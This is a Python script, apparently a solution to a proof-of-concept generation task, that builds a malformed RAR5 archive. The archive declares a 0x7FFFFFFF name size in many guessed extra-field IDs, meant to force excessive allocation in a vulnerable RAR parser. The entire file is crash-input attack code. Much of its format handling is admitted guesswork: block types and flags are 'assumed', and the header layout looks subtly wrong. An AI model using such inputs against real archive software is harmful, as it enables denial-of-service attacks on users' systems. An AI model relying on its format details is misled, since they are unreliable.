import binascii

class Solution:
    def solve(self, src_path: str) -> bytes:
        def leb128_encode(n: int) -> bytes:
            out = bytearray()
            while True:
                b = n & 0x7F
                n >>= 7
                if n:
                    out.append(b | 0x80)
                else:
                    out.append(b)
                    break
            return bytes(out)

        def le16(n: int) -> bytes:
            return bytes((n & 0xFF, (n >> 8) & 0xFF))

        def le32(n: int) -> bytes:
            return bytes((
                n & 0xFF,
                (n >> 8) & 0xFF,
                (n >> 16) & 0xFF,
                (n >> 24) & 0xFF
            ))

        # RAR5 signature
        sig = b"Rar!\x1a\x07\x01\x00"

        # Construct a RAR5 File block with extra area containing a filename-like field
        # with an extremely large declared name size to trigger the vulnerable path.
        # Block type (assumed FILE): 0x02
        block_type = b"\x02"

        # Block flags: set bit for extra area present, no data area
        # Assumption: EXTRA_PRESENT = 0x0001
        flags_le = le16(0x0001)

        # Build extra area:
        # We include many candidate extra field IDs; one of them should be treated as filename field
        # by the parser in vulnerable versions. Each field declares a very large name size to
        # provoke excessive allocation. To keep the actual block small, we do not include the name data.
        extra = bytearray()

        # Candidate IDs that might correspond to filename-related extra fields in RAR5.
        candidate_ids = [
            1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
            12, 14, 16, 20, 21, 22, 23, 24, 25
        ]

        # Large name size encoded in LEB128; large enough to trigger the bug.
        large_name_size = (1 << 31) - 1  # 0x7FFFFFFF
        large_name_size_encoded = leb128_encode(large_name_size)

        # For each candidate field ID, encode:
        # field_id (vint), field_size (vint), field_payload:
        #   Here payload is: name_size (vint) only (no name bytes), minimal to provoke allocation path.
        for fid in candidate_ids:
            field_payload = large_name_size_encoded
            field_size = len(field_payload)
            extra += leb128_encode(fid)
            extra += leb128_encode(field_size)
            extra += field_payload

        # Extra area size
        extra_size_enc = leb128_encode(len(extra))

        # Assemble header data (without CRC)
        header_data = bytearray()
        header_data += block_type
        header_data += flags_le
        header_data += extra_size_enc
        header_data += extra

        # Compute CRC32 over header_data
        crc = binascii.crc32(header_data) & 0xFFFFFFFF
        crc_le = le32(crc)

        block = crc_le + header_data

        # Add an END block to make parser more tolerant if needed (optional)
        # END block type (assumed 0x05), no flags, no extra/data
        end_block_type = b"\x05"
        end_flags_le = le16(0x0000)
        end_header_data = end_block_type + end_flags_le
        end_crc = binascii.crc32(end_header_data) & 0xFFFFFFFF
        end_block = le32(end_crc) + end_header_data

        poc = sig + block + end_block

        # Pad to approximate known PoC size without affecting parse semantics
        # Only pad with zeros at the end, which should be ignored.
        target_len = 1089
        if len(poc) < target_len:
            poc += b"\x00" * (target_len - len(poc))

        return bytes(poc)